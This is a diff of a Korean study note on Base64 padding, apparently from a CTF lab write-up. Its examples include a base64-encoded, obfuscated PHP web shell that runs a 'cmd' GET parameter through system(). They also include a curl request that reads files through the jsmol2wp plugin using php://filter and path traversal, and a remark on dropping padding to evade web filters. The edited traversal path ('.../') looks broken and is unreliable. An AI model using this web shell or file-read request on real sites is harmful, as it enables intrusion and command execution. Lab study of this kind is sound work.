@@ -2,10 +2,10 @@
 
 ---
 
-## 📌 패딩(`=`)이란? → **진짜 중요**
+## 📌 패딩(`=`)이란? → 진짜 중요
 
 - `Base64`는 3바이트(24비트)를 6비트씩 4개로 쪼개 문자로 인코딩함.
-- 원본 데이터가 3바이트 단위가 아니면 6비트를 채우기 위해 `=` 또는 `==`을 **패딩 문자**로 붙임.
+- 원본 데이터가 3바이트 단위가 아니면 6비트를 채우기 위해 `=` 또는 `==`을 패딩 문자로 붙임.
 
 | 원본 바이트 수 | 인코딩 후 길이 | 패딩 |
 | -------------- | -------------- | ---- |
@@ -13,9 +13,9 @@
 | 2바이트        | 3 + `=`        | 1개  |
 | 1바이트        | 2 + `==`       | 2개  |
 
-🔒 패딩은 **데이터 정렬을 위한 것**이지, **암호화나 보안 요소는 아님**
-🛠️ 실전에서는 일부 도구나 웹 필터 우회를 위해 **패딩이 생략**되기도 함
-✅ `base64 -d`는 패딩이 없어도 자동으로 보정하여 **디코딩 잘됨**
+🔒 패딩은 데이터 정렬을 위한 것이지, 암호화나 보안 요소는 아님
+🛠️ 실전에서는 일부 도구나 웹 필터 우회를 위해 패딩이 생략되기도 함
+✅ `base64 -d`는 패딩이 없어도 자동으로 보정하여 디코딩 잘됨
 
 ```bash
 # 패딩 있는 경우
@@ -51,7 +51,7 @@ echo -n "YWRtaW46cGFzc3dvcmQ=" | base64 -d  # admin:password
 echo -n "CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=" | tr -d '=' | base64 -d
 
 # curl 로 한 번에 확인
-curl "http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/read=convert.base64-encode/resource=../../hello.php" > hello.b64
+curl "http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/read=convert.base64-encode/resource=.../hello.php" > hello.b64
 base64 -d hello.b64 > hello.php
 
 ```
